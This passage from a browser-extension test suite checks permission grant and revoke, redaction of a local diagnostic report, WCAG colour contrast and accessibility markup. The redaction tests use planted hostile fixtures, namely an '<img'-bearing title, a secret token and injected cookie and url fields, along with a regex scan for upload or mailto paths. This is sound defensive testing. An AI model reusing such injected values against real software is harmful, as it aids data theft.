      const declared = Object.assign(JSON.parse(H.readRoot('manifest.json')),
        { optional_host_permissions: ['<all_urls>'] });
      const chromeB = H.makeChrome({
        tabs: [{ id: 1, windowId: 1, active: true, title: 'x', url: 'https://a.example/' }],
        manifest: declared,
        permissionsGranted: false
      });
      const bgB = H.loadBackground({ chrome: chromeB });
      const domB = H.makeDom({ html: ['pages/options.html'] });
      H.loadPage(['lib/settings.js', 'lib/storage.js', 'pages/common.js', 'pages/options.js'],
        { chrome: chromeB, idb: bgB.idb, dom: domB });
      await domB.ready();
      await tick(12);
      check('declare optional_host_permissions and the section appears — no code change',
        domB.$('siteAccessSection').hidden === false, 'hidden=' + domB.$('siteAccessSection').hidden);
      check('the state comes from permissions.contains, never from a variable that can go stale',
        chromeB.__callsOf('permissions.contains').length >= 1,
        chromeB.__callsOf('permissions.contains').length + ' call(s) to the browser');
      check('NOT GRANTED reads as the true scope of activeTab, and the offer is to grant',
        /only read a tab after you click/.test(domB.$('siteAccessState').textContent) &&
        domB.$('grantBtn').hidden === false && domB.$('revokeBtn').hidden === true,
        domB.$('siteAccessState').textContent);

      domB.$('grantBtn').click();
      await tick(12);
      check('the grant goes through the browser\'s own prompt',
        chromeB.__callsOf('permissions.request').length === 1 &&
        JSON.stringify(chromeB.__lastCall('permissions.request').args[0]) === '{"origins":["<all_urls>"]}',
        JSON.stringify(chromeB.__lastCall('permissions.request').args[0]));
      check('GRANTED says plainly what was granted — no softening, no reassurance',
        /can currently read every site you visit/.test(domB.$('siteAccessState').textContent),
        domB.$('siteAccessState').textContent);
      check('and REVOKE is now offered — the whole point of the section',
        domB.$('revokeBtn').hidden === false && domB.$('grantBtn').hidden === true,
        'revoke visible');

      domB.$('revokeBtn').click();
      await tick(12);
      check('revoking actually calls permissions.remove with the same origins',
        chromeB.__callsOf('permissions.remove').length === 1 &&
        JSON.stringify(chromeB.__lastCall('permissions.remove').args[0]) === '{"origins":["<all_urls>"]}',
        JSON.stringify(chromeB.__lastCall('permissions.remove').args[0]));
      check('and the row goes back to telling the truth about what is held now',
        /only read a tab after you click/.test(domB.$('siteAccessState').textContent) &&
        domB.$('grantBtn').hidden === false,
        domB.$('siteAccessState').textContent);

      /* A grant can also be changed from chrome://extensions while this page is
         open. A row that says "granted" over a permission the user took away
         five seconds ago is worse than no row at all — so it is driven from
         OUTSIDE the product here, with no button press at all. */
      check('the page re-reads on the browser\'s own change events, both directions',
        chromeB.__hasListener('permissions.onAdded') && chromeB.__hasListener('permissions.onRemoved'),
        'onAdded + onRemoved');
      chromeB.__permissionsGranted(true);          // as if from chrome://extensions
      await tick(12);
      check('a grant made OUTSIDE the product updates the row without anyone touching it',
        /can currently read every site/.test(domB.$('siteAccessState').textContent) &&
        domB.$('revokeBtn').hidden === false,
        domB.$('siteAccessState').textContent);
      chromeB.__permissionsGranted(false);
      await tick(12);
      check('and a revoke made outside it does too',
        /only read a tab after you click/.test(domB.$('siteAccessState').textContent),
        domB.$('siteAccessState').textContent);
      check('the origins come from the MANIFEST, so the row cannot claim what the tool never declared',
        /getManifest\(\)\.optional_host_permissions/.test(stripJsComments(H.readRoot('pages/options.js'))),
        'optionalOrigins() reads the manifest');
    }
  });

  /* ================================================================== */
  /* diagnostic — a report path with no backend                          */
  /* ================================================================== */
  /* The product makes no network calls, so there is nothing to send a report
     TO. What the user gets is a file they read, keep and send themselves —
     which makes redaction a design constraint, because that file is about to
     leave the machine by a route this product cannot see.

     Teeth: add `title: row.title` to skBuildDiagnostic and the no-page-text
     check goes red; add `url` and the no-url check goes red. */
  await runSection('diagnostic', async () => {
    const { chrome, bg } = boot();
    await tick();
    await chrome.storage.sync.set({ keepHistory: true });

    /* Make a real mess first: a hostile title stored, a hostile url parked in
       the failure note, a job in flight on the hostile tab. */
    await bg.send({ type: 'SK_TAB_INFO', tabId: 7 });     // hostile url, has a title
    await bg.send({ type: 'SK_TAB_INFO', tabId: 3 });     // blank title -> parks a failure
    await bg.sandbox.beginJob({ id: 7, windowId: 2, url: HOSTILE_URL }, 'copy-title');
    await tick(6);
    check('the fixture really does hold the dangerous values a report could leak',
      itemCount(bg) === 1 && !!chrome.storage.session.__data.get('skLastError') &&
      bg.sandbox.SKJOBS.size() === 1,
      'a stored hostile title, a parked note, and a job in flight');

    const facts = await bg.send({ type: 'SK_DIAGNOSTIC' });
    check('the worker answers with COUNTS and declared codes, and nothing else',
      facts.ok === true &&
      Object.keys(facts.facts).sort().join(',') ===
        'itemRows,jobActions,jobTimeoutMs,jobsInFlight,scratchRows,scratchTtlMs',
      Object.keys(facts.facts).sort().join(','));
    check('the worker\'s half of the report names no url, no origin and no title',
      JSON.stringify(facts).indexOf(SECRET) < 0 &&
      JSON.stringify(facts).indexOf('bank.example') < 0 &&
      JSON.stringify(facts).indexOf('<img') < 0,
      JSON.stringify(facts.facts));
    check('the job actions it reports come from the declared ACTIONS list, not from the message',
      facts.facts.jobActions.every(a => bg.eval('ACTIONS').indexOf(a) >= 0),
      JSON.stringify(facts.facts.jobActions));

    /* The builder, on its own, with everything hostile handed straight to it. */
    const dom = H.makeDom({ html: ['pages/options.html'], persisted: false });
    const page = H.loadPage(['lib/settings.js', 'pages/common.js'], { chrome, dom });
    const report = page.sandbox.skBuildDiagnostic({
      version: '1.2.3',
      uiLocale: 'en',
      userAgent: dom.navigator.userAgent,
      settings: Object.assign({}, bg.sandbox.SK_DEFAULTS, {
        // the shapes a tool will grow, handed in on purpose
        filenameTemplate: 'invoices-for-{client}-ACME-Legal',
        allowedHosts: ['intranet.acme.example'],
        keepHistory: true,
        theme: 'dark'
      }),
      facts: facts.facts,
      durability: 'dataBestEffort',
      usage: 2560, quota: 10485760,
      lastError: chrome.storage.session.__data.get('skLastError'),
      now: 1767225600000
    });
    const wire = JSON.stringify(report);

    check('the report carries what a maintainer actually needs: version, locale, engine, counts',
      report.version === '1.2.3' && report.uiLocale === 'en' &&
      report.platform === 'Chrome 141' && report.storage.itemRows === 1,
      report.platform + ' · ' + JSON.stringify(report.storage));
    check('the platform is an ENGINE AND A MAJOR VERSION, not the user-agent string',
      wire.indexOf('AppleWebKit') < 0 && wire.indexOf('Windows NT') < 0 && wire.indexOf('537.36') < 0,
      report.platform);
    check('NO page title, NO url, NO path, NO query and NO token reaches the report',
      wire.indexOf(SECRET) < 0 && wire.indexOf('<img') < 0 &&
      wire.indexOf('statement') < 0 && wire.indexOf('token=') < 0 && wire.indexOf("it's") < 0,
      'clean');
    check('a FREE-TEXT setting is reported as a shape, never as its value — that is where a client name lives',
      report.settings.filenameTemplate === '(text)' &&
      wire.indexOf('ACME') < 0 && wire.indexOf('intranet.acme.example') < 0,
      JSON.stringify(report.settings));
    check('a boolean and a number ARE reported — they cannot identify anything and they are the useful half',
      report.settings.keepHistory === true && report.settings.historyLimit === 50,
      JSON.stringify({ keepHistory: report.settings.keepHistory, historyLimit: report.settings.historyLimit }));
    check('an ENUM string is reported verbatim, because its whole value space is declared',
      report.settings.theme === 'dark', report.settings.theme);
    check('the last failure is a reason KEY plus a scheme and host — the note never had a url to leak',
      report.lastFailure && report.lastFailure.reasonKey === 'reasonNoTitle' &&
      report.lastFailure.origin === 'https://blank.example',
      JSON.stringify(report.lastFailure));
    check('the report is built from a DECLARED list — an unknown input field cannot smuggle itself in',
      (() => {
        const sneaky = page.sandbox.skBuildDiagnostic({
          pageText: 'the whole document', url: HOSTILE_URL, cookies: 'session=' + SECRET,
          facts: { itemRows: 0 }, settings: {}
        });
        const s = JSON.stringify(sneaky);
        return s.indexOf(SECRET) < 0 && s.indexOf('whole document') < 0 && !('url' in sneaky);
      })(),
      'three unrequested fields, none of them survived');
    check('the report\'s top-level shape is fixed, so a reviewer can check it once',
      Object.keys(report).sort().join(',') ===
        'createdAt,jobs,lastFailure,platform,report,schema,settings,storage,uiLocale,version',
      Object.keys(report).sort().join(','));

    /* THE REVIEW STEP. Nothing reaches the disk before the user has seen it. */
    const dom2 = H.makeDom({ html: ['pages/options.html'], persisted: false });
    const page2 = H.loadPage(['lib/settings.js', 'lib/storage.js', 'pages/common.js', 'pages/options.js'],
      { chrome, idb: bg.idb, dom: dom2 });
    await dom2.ready();
    await tick(14);
    const urlsBefore = dom2.objectUrls.length;
    dom2.$('reportBtn').focus();
    dom2.$('reportBtn').click();
    await tick(16);
    const dlg = dom2.$('sk-confirm');
    const pre = dlg && dlg.find('pre')[0];
    check('the report is SHOWN before it is written, in a review pane inside the dialog',
      !!pre && pre.textContent.length > 100 && JSON.parse(pre.textContent).report === 'skeleton-problem-report',
      pre ? pre.textContent.length + ' characters of JSON on screen' : 'no preview pane');
    check('the pane is reachable by keyboard — it scrolls, and approving what you cannot scroll is approving unseen',
      !!pre && pre.getAttribute('tabindex') === '0', pre ? 'tabindex=' + pre.getAttribute('tabindex') : 'none');
    check('what is on screen contains no url, no title and no token either',
      !!pre && pre.textContent.indexOf(SECRET) < 0 && pre.textContent.indexOf('<img') < 0 &&
      pre.textContent.indexOf('bank.example/') < 0,
      'the preview is the file');
    check('nothing has been written yet — the file is built, shown, and only then saved',
      dom2.objectUrls.length === urlsBefore, dom2.objectUrls.length - urlsBefore + ' files written so far');
    check('the preview text is a TEXT NODE — a value that did leak would be shown, never rendered',
      dom2.markupWrites.length === 0 && pre.find('img').length === 0, dom2.markupWrites.length + ' markup writes');

    dlg.find('button')[0].click();      // Cancel
    await tick(10);
    check('CANCEL writes nothing at all — default deny, on the report too',
      dom2.objectUrls.length === urlsBefore && dlg.parentNode === null,
      (dom2.objectUrls.length - urlsBefore) + ' files written, dialog detached=' + (dlg.parentNode === null));
    check('focus returned to the button that opened it',
      dom2.activeElement === dom2.$('reportBtn'),
      dom2.activeElement ? '#' + dom2.activeElement.id : 'nothing focused');

    dom2.$('reportBtn').click();
    await tick(16);
    dom2.$('sk-confirm').find('button')[1].click();     // Save the report
    await tick(16);
    const saved = dom2.objectUrls[dom2.objectUrls.length - 1];
    const savedText = saved ? await saved.text() : '';
    check('confirming writes the file, and the bytes on disk are the bytes that were shown',
      dom2.objectUrls.length === urlsBefore + 1 &&
      JSON.parse(savedText).report === 'skeleton-problem-report' &&
      savedText.indexOf(SECRET) < 0,
      saved ? saved.size + ' bytes' : 'nothing written');
    check('the report never left the machine — no network call from the page that built it',
      page2.net.length === 0, page2.net.length + ' attempts');
    const reportSends = H.scanSource(/mailto:|formaction|report.*endpoint/i, ['.js', '.html']);
    check('there is no upload path, no mailto and no endpoint anywhere in shipped code',
      reportSends.length === 0, reportSends.join(' | ') || 'the user chooses how to send it');
  });

  /* ================================================================== */
  /* theme — WCAG contrast, COMPUTED, in both themes                    */
  /* ================================================================== */
  /* Contrast is arithmetic over declared hex values. No browser, no
     screenshot, no opinion: change --accent to something pretty and this
     section prints the number it computed and goes red if it is under the
     floor. That is what makes TEMPLATE.md safe to hand to 67 authors.

     Teeth: set --accent to #8f88ff in the LIGHT block and watch
     "primary button label on its fill" go red at 2.94:1. */
  await runSection('theme', async () => {
    const COMMON = stripCssComments(H.readRoot('pages/common.css'));
    const T = H.parseTokenBlocks(COMMON);

    check('pages/common.css declares all three token blocks',
      !!T.light && !!T.dark && !!T.darkMedia,
      'light=' + !!T.light + ' dark=' + !!T.dark + ' prefers-color-scheme=' + !!T.darkMedia);

    /* CSS COMMENTS DO NOT NEST and the first close-marker wins. This file is
       heavily commented by design, and writing a close-marker inside prose ends
       the comment there — everything after it is parsed as CSS, and the block
       that follows gets swallowed as some bogus selector's body.
       This is not hypothetical: it happened here. The banner explaining the
       logical-properties rule quoted a comment, which ended the banner early and
       ate the ENTIRE LIGHT TOKEN BLOCK. Dark mode looked perfect (its blocks come
       later), light mode silently had no --accent and therefore no focus ring at
       all, and every static check still passed because a regex over the file
       finds `:root {` whether the browser can reach it or not. The browser tier
       found it. This is the cheap version that would have found it first. */
    const RAW_ALL = shippedStylesheets(true);
    const stray = [], unbalanced = [];
    for (const [name, text] of RAW_ALL) {
      const stripped = stripCssComments(text);
      if (/\*\//.test(stripped) || /\/\*/.test(stripped)) stray.push(name);
      const open = (stripped.match(/\{/g) || []).length;
      const close = (stripped.match(/\}/g) || []).length;
      if (open !== close) unbalanced.push(name + ' ' + open + '{ vs ' + close + '}');
    }
    check('no stylesheet has a stray comment marker (one inside a comment ends it early and eats the next block)',
      stray.length === 0, stray.join(', ') || RAW_ALL.size + ' stylesheets, every comment closed exactly once');
    check('every stylesheet has balanced braces once its comments are removed',
      unbalanced.length === 0, unbalanced.join(', ') || 'balanced');

    /* The dark palette is written twice — the explicit choice and "follow the
       system" — and the two drifting apart is invisible until someone flips the
       toggle in Options. */
    const driftKeys = Object.keys(Object.assign({}, T.dark, T.darkMedia));
    const drift = driftKeys.filter(k => (T.dark[k] || '') !== (T.darkMedia[k] || ''));
    check('the two dark blocks declare IDENTICAL values (they are copies, and copies drift)',
      drift.length === 0, drift.join(', ') || driftKeys.length + ' tokens match');

    const darkOnly = Object.keys(T.dark).filter(k => !(k in T.light));
    check('the dark block overrides tokens, it never invents them',
      darkOnly.length === 0, darkOnly.join(', ') || 'no dark-only token');

    /* Every stylesheet the browser loads, discovered rather than listed. It
       still looks inside <style> blocks even though shipped pages may no longer
       have any (the CSP forbids them, and === network === enforces that) —
       because the day somebody adds one back, it must be graded like every
       other stylesheet rather than quietly escaping the token rules. */
    const CSS = shippedStylesheets();
    check('the stylesheet scan found every sheet the browser loads',
      CSS.size >= 3 && Array.from(CSS.keys()).some(k => k.indexOf('options.css') >= 0),
      Array.from(CSS.keys()).join(', '));

    const used = new Set();
    for (const [, text] of CSS) {
      const re = /var\(\s*(--[\w-]+)/g;
      let m;
      while ((m = re.exec(text))) used.add(m[1]);
    }
    const undeclared = Array.from(used).filter(t => !(t in T.light));
    check(used.size + ' var(--token) references all resolve in the light block',
      undeclared.length === 0, undeclared.join(', ') || 'every token is declared');

    /* THE RULE THAT MAKES THE ARITHMETIC BELOW COMPLETE: a colour that is not a
       token is a colour nobody computed a ratio for. The token blocks are cut
       out of common.css first; everything else — every rule in every sheet, and
       every <style> in every page — must be free of literal colours. System
       colour keywords inside the forced-colors block are keywords, not
       literals, and are the correct thing there. */
    const tokenBlockRanges = [];
    for (const re of [/:root\s*\{/, /:root\[data-theme\s*=\s*"dark"\]\s*\{/, /@media\s*\(prefers-color-scheme:\s*dark\)\s*\{/]) {
      const m = re.exec(COMMON);
      if (!m) continue;
      let i = m.index + m[0].length, depth = 1;
      while (i < COMMON.length && depth > 0) { if (COMMON[i] === '{') depth++; else if (COMMON[i] === '}') depth--; i++; }
      tokenBlockRanges.push([m.index, i]);
    }
    const literals = [];
    const COLOUR_LITERAL = /#[0-9a-fA-F]{3,8}\b|\b(?:rgba?|hsla?)\s*\(/g;
    for (const [name, text] of CSS) {
      const isCommon = name === 'pages/common.css';
      let m;
      COLOUR_LITERAL.lastIndex = 0;
      while ((m = COLOUR_LITERAL.exec(text))) {
        if (isCommon && tokenBlockRanges.some(([a, b]) => m.index >= a && m.index < b)) continue;
        literals.push(name + ':' + m[0]);
      }
    }
    check('no shipped stylesheet declares a colour outside the token blocks',
      literals.length === 0, literals.slice(0, 6).join(' | ') || 'every colour is a token');

    /* EVERY PAIRING THE STYLESHEETS ACTUALLY USE, declared here so the list is
       reviewable, and computed below in both themes. A token that is not in
       this table and not in EXEMPT is a red: adding a colour without saying
       what it is drawn against is exactly how the old palette shipped a 2.28:1
       "Saved" badge. */
    const AA_TEXT = 4.5;      // body text
    const AA_NONTEXT = 3.0;   // WCAG 1.4.11: control boundaries and state
    const PAIRINGS = [
      ['page text on the page', '--fg', '--bg', AA_TEXT],
      ['page text on a card', '--fg', '--panel', AA_TEXT],
      ['button label at rest', '--fg', '--panel', AA_TEXT],
      ['button label on hover', '--fg', '--bg2', AA_TEXT],
      ['muted text on a card', '--fg2', '--panel', AA_TEXT],
      ['muted text on the page', '--fg2', '--bg', AA_TEXT],
      ['muted text on a hovered row', '--fg2', '--bg2', AA_TEXT],
      ['primary button label on its fill', '--accent-fg', '--accent', AA_TEXT],
      ['primary button label on the hover fill', '--accent-fg', '--accent-hover', AA_TEXT],
      ['the accent used AS TEXT on a card (a link)', '--accent', '--panel', AA_TEXT],
      ['the accent used AS TEXT on the page', '--accent', '--bg', AA_TEXT],
      ['danger button label on a card', '--danger', '--panel', AA_TEXT],
      ['danger button label on the page', '--danger', '--bg', AA_TEXT],
      ['error-note text on the error surface', '--danger-fg', '--danger-bg', AA_TEXT],
      ['the "Saved" pill label on its fill', '--ok-fg', '--ok', AA_TEXT],
      ['the "Saved" pill against the page behind it', '--ok', '--bg', AA_NONTEXT],
      ['toast text on the toast', '--bg', '--fg', AA_TEXT],
      ['the switch knob when the switch is on', '--accent-fg', '--accent', AA_NONTEXT],
      ['the switch knob when the switch is off', '--fg2', '--bg2', AA_NONTEXT],
      ['the switch fill when on, against a card', '--accent', '--panel', AA_NONTEXT],
      ['the edge of a control on a card', '--line-strong', '--panel', AA_NONTEXT],
      ['the edge of a control on the page', '--line-strong', '--bg', AA_NONTEXT],
      ['the edge of a control on a hovered row', '--line-strong', '--bg2', AA_NONTEXT],
      ['the focus ring against a card', '--accent', '--panel', AA_NONTEXT],
      ['the focus ring against the page', '--accent', '--bg', AA_NONTEXT],
      ['the focus ring against a hovered row', '--accent', '--bg2', AA_NONTEXT]
    ];
    /* Tokens with no contrast requirement, each with the reason it has none.
       An entry here is a decision someone made, not an oversight. */
    const EXEMPT = {
      '--line': 'a hairline between two surfaces — purely decorative, WCAG 1.4.11 exempts it',
      '--danger-bg': 'a surface, graded through the text drawn on it',
      '--scrim': 'a translucent backdrop behind a modal; it darkens, it does not inform',
      '--shadow': 'not a colour token — a box-shadow value'
    };

    for (const themeName of ['light', 'dark']) {
      const P = T[themeName];
      let worstLabel = '', worst = Infinity, failures = [];
      const lines = [];
      for (const [label, fgTok, bgTok, min] of PAIRINGS) {
        const r = H.contrastRatio(P[fgTok], P[bgTok]);
        if (r == null) { failures.push(label + ' (unreadable token)'); continue; }
        if (r < worst) { worst = r; worstLabel = label; }
        lines.push(r.toFixed(2).padStart(6) + ' : 1  (needs ' + min.toFixed(1) + ')  ' + label +
          '   ' + fgTok + ' ' + P[fgTok] + ' on ' + bgTok + ' ' + P[bgTok]);
        if (r < min) failures.push(label + ' ' + r.toFixed(2) + ':1 < ' + min);
      }
      check(themeName + ': all ' + PAIRINGS.length + ' colour pairings clear their WCAG floor',
        failures.length === 0,
        failures.join(' | ') || 'worst is ' + worst.toFixed(2) + ':1 — ' + worstLabel);
      for (const l of lines) note(l);
    }

    const graded = new Set();
    for (const [, fg, bg] of PAIRINGS) { graded.add(fg); graded.add(bg); }
    const colourTokens = Object.keys(T.light).filter(t => H.parseColor(T.light[t]) !== null);
    const ungraded = colourTokens.filter(t => !graded.has(t) && !(t in EXEMPT));
    check('every colour token is either graded above or exempt WITH A REASON',
      ungraded.length === 0,
      ungraded.join(', ') || colourTokens.length + ' colour tokens, ' + Object.keys(EXEMPT).length + ' exempt');

    /* The badge is painted by the worker, not by CSS, so it is the one colour
       that can drift out of the palette without a stylesheet noticing. */
    const badge = /BADGE_COLOR\s*=\s*'([^']+)'/.exec(H.readRoot('background.js'));
    check('background.js BADGE_COLOR still matches the light --accent',
      !!badge && badge[1].toLowerCase() === String(T.light['--accent']).toLowerCase(),
      (badge ? badge[1] : 'not found') + ' vs ' + T.light['--accent']);
  });

  /* ================================================================== */
  /* a11y — static markup and CSS, then the runtime behaviour           */
  /* ================================================================== */
  await runSection('a11y', async () => {
    const PAGES = Array.from(H.readShipped(['.html']).entries()).map(([f, t]) => [f, stripHtmlComments(t)]);
    check('the a11y scan found every shipped page', PAGES.length >= 2,
      PAGES.map(p => p[0]).join(', '));

    const EN = JSON.parse(H.readRoot('_locales/en/messages.json'));

    /* ---- accessible names ---- */
    /* The defect this exists for, verbatim from the reference's own list:
       "options.html's 26 controls have no accessible name at all". A settings
       page where every switch announces as "checkbox, unchecked" is not
       degraded, it is unusable — and it is the page carrying the privacy
       promise, where being unsure what you just toggled matters most. */
    const NAMEABLE = new Set(['button', 'select', 'textarea', 'input', 'a']);
    /* Content is an accessible name for these; for a select it is the OPTIONS,
       which name nothing. */
    const NAMED_BY_CONTENT = new Set(['button', 'a', 'summary']);
    const unnamed = [], titleOnly = [], badRefs = [], positiveTab = [], noAlt = [];
    const roleButtons = [], inlineHandlers = [];

    for (const [file, html] of PAGES) {
      const els = H.parseElements(html);
      const ids = new Set(els.map(e => e.attrs.get('id')).filter(Boolean));
      const labelFor = new Map();
      for (const e of els) if (e.tag === 'label' && e.attrs.has('for')) labelFor.set(e.attrs.get('for'), e.text);

      for (const e of els) {
        const a = e.attrs;
        for (const attr of ['aria-labelledby', 'aria-describedby', 'aria-controls']) {
          if (!a.has(attr)) continue;
          for (const ref of String(a.get(attr)).split(/\s+/).filter(Boolean)) {
            if (!ids.has(ref)) badRefs.push(file + ' ' + e.tag + '[' + attr + '=' + ref + ']');
          }
        }
        if (a.has('tabindex') && Number(a.get('tabindex')) > 0) {
          positiveTab.push(file + ' ' + e.tag + ' tabindex=' + a.get('tabindex'));
        }
        if (a.get('role') === 'button' && e.tag !== 'button') roleButtons.push(file + ' <' + e.tag + ' role=button>');
        for (const [k] of a) if (k.slice(0, 2) === 'on') inlineHandlers.push(file + ' ' + e.tag + '[' + k + ']');
        if (e.tag === 'img' && !a.has('alt')) noAlt.push(file + ' <img src=' + a.get('src') + '>');

        if (!NAMEABLE.has(e.tag)) continue;
        if (e.tag === 'input' && (a.get('type') === 'hidden')) continue;

        const fromContent = NAMED_BY_CONTENT.has(e.tag) && /[\p{L}\p{N}]/u.test(e.text || '');
        const fromAria = a.has('aria-label') && String(a.get('aria-label')).trim() !== '';
        const fromRef = a.has('aria-labelledby') &&
          String(a.get('aria-labelledby')).split(/\s+/).every(r => ids.has(r));
        const fromLabel = a.has('id') && labelFor.has(a.get('id')) && /[\p{L}\p{N}]/u.test(labelFor.get(a.get('id')) || '');
        const fromValue = e.tag === 'input' && ['submit', 'button', 'reset'].indexOf(a.get('type')) >= 0 && a.has('value');
        const fromAlt = e.tag === 'input' && a.get('type') === 'image' && a.has('alt');
        const fromTitle = a.has('title') && String(a.get('title')).trim() !== '';

        const named = fromContent || fromAria || fromRef || fromLabel || fromValue || fromAlt;
        const label = file + ' <' + e.tag + (a.get('id') ? ' #' + a.get('id') : '') + '>';
        if (!named && fromTitle) titleOnly.push(label);
        else if (!named) unnamed.push(label);
      }
    }

    check('every control on every shipped page resolves an accessible name',
      unnamed.length === 0, unnamed.join(' | ') || 'all named');
    /* Per HTML-AAM an element's CONTENT beats its title attribute, so a button
       reading "◐" with title="Toggle theme" announces as "◐". title is a mouse
       tooltip; it is not a name. */
    check('no control is named by title alone (content beats title — it would announce as its glyph)',
      titleOnly.length === 0, titleOnly.join(' | ') || 'none');
    check('every aria-labelledby / aria-describedby / aria-controls idref exists in its own page',
      badRefs.length === 0, badRefs.join(' | ') || 'every idref resolves');
    check('no positive tabindex anywhere — DOM order IS the tab order',
      positiveTab.length === 0, positiveTab.join(' | ') || 'none');
    check('no div-as-button: nothing but a <button> carries role="button"',
      roleButtons.length === 0, roleButtons.join(' | ') || 'none');
    check('no inline on* handler in any page (CSP forbids it, and it hides the control)',
      inlineHandlers.length === 0, inlineHandlers.join(' | ') || 'none');
    check('every <img> declares alt (empty alt is the correct answer for decoration)',
      noAlt.length === 0, noAlt.join(' | ') || 'all declared');

    /* ---- document-level semantics ---- */
    const noLang = [], noDir = [], headings = [];
    for (const [file, html] of PAGES) {
      const htmlTag = /<html\b([^>]*)>/i.exec(html);
      const a = htmlTag ? H.parseAttrs(htmlTag[1]) : new Map();
      if (!a.get('lang')) noLang.push(file);
      if (!a.get('dir')) noDir.push(file);
      const h1 = (html.match(/<h1\b/gi) || []).length;
      headings.push(file + '=' + h1);
      check(file + ' has exactly one <h1>', h1 === 1, h1 + ' <h1> element(s)');
    }
    check('every page declares lang on <html> (Turkish "i" uppercases to "İ", not "I")',
      noLang.length === 0, noLang.join(', ') || headings.join(' '));
    check('every page declares dir on <html> (three of the 55 locales are RTL)',
      noDir.length === 0, noDir.join(', ') || 'lang + dir on both');

    /* ---- live regions ---- */
    /* DECLARED, not discovered: a tool that grows a fifth status surface has to
       add a line here, which is the moment someone decides whether it is polite
       or assertive. A region must also be in the DOM before it has text — one
       that gains role and text in the same tick is not reliably announced. */
    const LIVE_REGIONS = [
      ['popup/popup.html', 'err', 'alert', 'the only failure surface in the product'],
      ['popup/popup.html', 'result', 'status', 'the result of the tool\'s whole job'],
      ['pages/options.html', 'dataSummary', 'status', 'what is stored, after a wipe'],
      ['pages/options.html', 'saveNote', 'status', 'the only confirmation a setting was written']
    ];
    for (const [file, id, role, why] of LIVE_REGIONS) {
      const html = stripHtmlComments(H.readRoot(file));
      const el = H.parseElements(html).find(e => e.attrs.get('id') === id);
      check(file + ' #' + id + ' is a role="' + role + '" region — ' + why,
        !!el && el.attrs.get('role') === role, el ? 'role=' + el.attrs.get('role') : 'element not found');
    }
    check('skToast sets role and aria-live at CREATION, before any text',
      /t\.setAttribute\('role', 'status'\)[\s\S]{0,120}elText\(t,/.test(H.readRoot('pages/common.js')),
      'the region exists before it speaks');

    /* ---- the message keys the markup declares ---- */
    const missingKeys = [];
    const unreadAttrs = [];
    for (const [file, html] of PAGES) {
      for (const e of H.parseElements(html)) {
        const k = e.attrs.get('data-i18n');
        if (k && !EN[k]) missingKeys.push(file + ' data-i18n="' + k + '"');
        for (const [name, key] of parseI18nAttrSpec(e.attrs.get('data-i18n-attr'))) {
          if (!key) missingKeys.push(file + ' data-i18n-attr "' + name + '" names no key');
          else if (!EN[key]) missingKeys.push(file + ' data-i18n-attr ' + name + ':' + key);
        }
        /* The pass reads TWO attributes and no others. data-i18n-title= and
           friends were the earlier spelling; one left behind in a copied tool
           is markup that looks translated, grades as translated, and renders
           English forever, because nothing ever reads it. */
        for (const name of e.attrs.keys()) {
          if (name.slice(0, 9) !== 'data-i18n') continue;
          if (name === 'data-i18n' || name === 'data-i18n-attr') continue;
          unreadAttrs.push(file + ' <' + e.tag + ' ' + name + '>');
        }
      }
    }
    check('every message key named in every page resolves in _locales/en',
      missingKeys.length === 0, missingKeys.join(' | ') || 'all resolve');
    check('no page carries a data-i18n-* attribute the pass does not read',
      unreadAttrs.length === 0,
      unreadAttrs.join(' | ') ||
        'data-i18n for text, data-i18n-attr="name:key" for attributes — those two and nothing else');

    /* ---- the fallback that stopped agreeing with the catalogue ----
       The English inside a [data-i18n] element is not decoration and it is not
       dead. It is what the FIRST PAINT shows, before skApplyI18n() has run, and
       it is what a reader of the diff believes the product says. The catalogue
       is what actually ships to the user and what all 54 other locales were
       generated from — so when the two disagree, the markup is lying about the
       product in the one place a human is most likely to read it.

       It drifts in one direction and always the same one: somebody improves a
       sentence in options.html because that is where they can see it, and the
       catalogue — 55 files away — keeps the old wording. Every other check here
       stays green, because the KEY still resolves and the text is still not
       hardcoded. This one caught three: two straight-vs-typographic apostrophes
       and one real difference of meaning ("your synced profile" against "your
       synced browser profile"), which is a claim about where a user's settings
       went.

       Whitespace is collapsed on both sides — the markup wraps, the JSON does
       not — and that is the only tolerance. */
    const fallbackDrift = [];
    for (const [file, html] of PAGES) {
      for (const e of H.parseElements(html)) {
        const key = e.attrs.get('data-i18n');
        if (!key || !EN[key]) continue;
        const want = String(EN[key].message).replace(/\s+/g, ' ').trim();
        const got = String(e.text).replace(/\s+/g, ' ').trim();
        if (got !== want) fallbackDrift.push(file + ' ' + key + ': markup "' + got + '" vs en "' + want + '"');
      }
    }
    check('every first-paint fallback in the markup is VERBATIM its _locales/en message',
      fallbackDrift.length === 0,
      fallbackDrift.slice(0, 4).join(' | ') ||
        'the English a reader sees in the file is the English the product ships');

    /* ---- the string that never reached the catalogue ---- */
    /* The check above grades the keys that EXIST. It is structurally blind to
       a label that was typed straight into the markup, which is the far more
       likely mistake and the one with no symptom: it renders perfectly, in
       English, in all 55 locales. See hardcodedPageText() for the rule. */
    const hardText = [];
    for (const [file, html] of PAGES) {
      for (const t of hardcodedPageText(html)) hardText.push(file + ': "' + t + '"');
    }
    check('no shipped page carries VISIBLE TEXT that is not a catalogue key',
      hardText.length === 0,
      hardText.slice(0, 6).join(' | ') ||
        'every sentence on every page comes from _locales — glyphs (◐ ↻ ✕) carry no letters and are named by data-i18n-attr');

    const hardAttrs = [];
    for (const [file, html] of PAGES) {
      for (const a of hardcodedPageAttrs(html)) hardAttrs.push(file + ': ' + a);
    }
    check('no title, aria-label, placeholder or alt is a hardcoded string',
      hardAttrs.length === 0,
      hardAttrs.slice(0, 6).join(' | ') ||
        'every visible attribute has its data-i18n-<attr> counterpart');

    /* ---- and the same bypass, in JavaScript ---- */
    /* Every text sink in this codebase takes a KEY: skToast('toastSaved'),
       elText(el, skMsg('optionsSaved')). Handing one an English sentence
       instead is the JS spelling of the same bug, and it is invisible for the
       same reason. A literal that is not in the catalogue is red whether it is
       a typo'd key or a raw sentence — both ship the wrong thing. */
    /* JS_STR matches all three string spellings — see its definition at the top
       of this file for why a single-quote-only pattern was a hole. */
    const badSink = [];
    for (const [file, src] of H.readShipped(['.js'])) {
      const code = stripJsComments(src);
      for (const m of code.matchAll(new RegExp('\\b(skToast|skMsg)\\(\\s*' + JS_STR, 'g'))) {
        const lit = litAt(m, 2);
        if (lit !== undefined && !EN[lit]) badSink.push(file + ': ' + m[1] + '(' + JSON.stringify(lit) + ')');
      }
      /* elText(node, 'literal') — a complete string literal as the whole
         argument. '' is clearing the node, and 'v' + version is a
         concatenation, not a bare literal, so neither matches. */
